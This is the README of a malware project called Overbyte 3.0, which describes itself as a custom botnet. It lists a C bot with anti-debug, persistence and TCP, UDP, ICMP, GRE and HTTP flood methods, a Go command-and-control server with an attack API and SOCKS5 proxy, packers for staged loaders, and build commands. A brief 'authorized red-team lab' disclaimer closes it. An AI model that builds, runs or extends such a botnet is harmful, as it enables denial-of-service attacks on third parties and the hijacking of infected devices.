# Overbyte 3.0

Custom botnet stack: **C bot** with ASCON/ChaCha, mutual authentication, anti-debug, and multi-method floods; **Go CNC** with MySQL, termfx SSH UI, HTTP attack API, SOCKS5 proxy, and signed payload distribution. Ships BearSSL cross-compile trees and packer tools.

> **Never commit** `.env.cnc`, live `config/config.json` secrets, or production keys.

## Layout

```
overbyte 3.0/
├── bot/              # Agent — methods/, crypto, persist, killer, watcher
├── cnc/              # Go server — bot/, attack/, api/, proxy/, database/
├── config/
│   ├── config.json   # Ports, policies
│   └── ui/*.tfx      # Operator terminal themes
├── tools/
│   ├── enc/          # String encrypt CLI
│   ├── keygen/
│   ├── packer/       # Compressed loader
│   └── bearssl-build/  # Per-arch TLS (large)
├── deploy/cnc.service
└── tut.txt
```

## Bot methods

| File | Method |
|------|--------|
| `tcp_method.c` | TCP floods |
| `udp_method.c` | UDP floods |
| `icmp_method.c` | ICMP |
| `gre_method.c` | GRE |
| `http_method.c` / `https_method.c` | Layer 7 |

## CNC

```bash
cd cnc
go mod tidy
go build
```

Configure MySQL DSN via `config/config.json` and environment (see `.env.cnc` example—replace all values locally).

Operator connects via SSH/telnet-style session using `.tfx` UI skins.

## Bot build

Use project Makefile/cross scripts in `bot/` and `tools/bearssl-build/<arch>/`.

## Tools

```bash
cd tools/enc && go build
cd tools/keygen && go build
```

## Packer

`tools/packer/` — generates compressed staged loaders (`loader.c`, `compress_payload.c`).

## Disclaimer

Authorized red-team lab. Remove all credentials before `git push`.
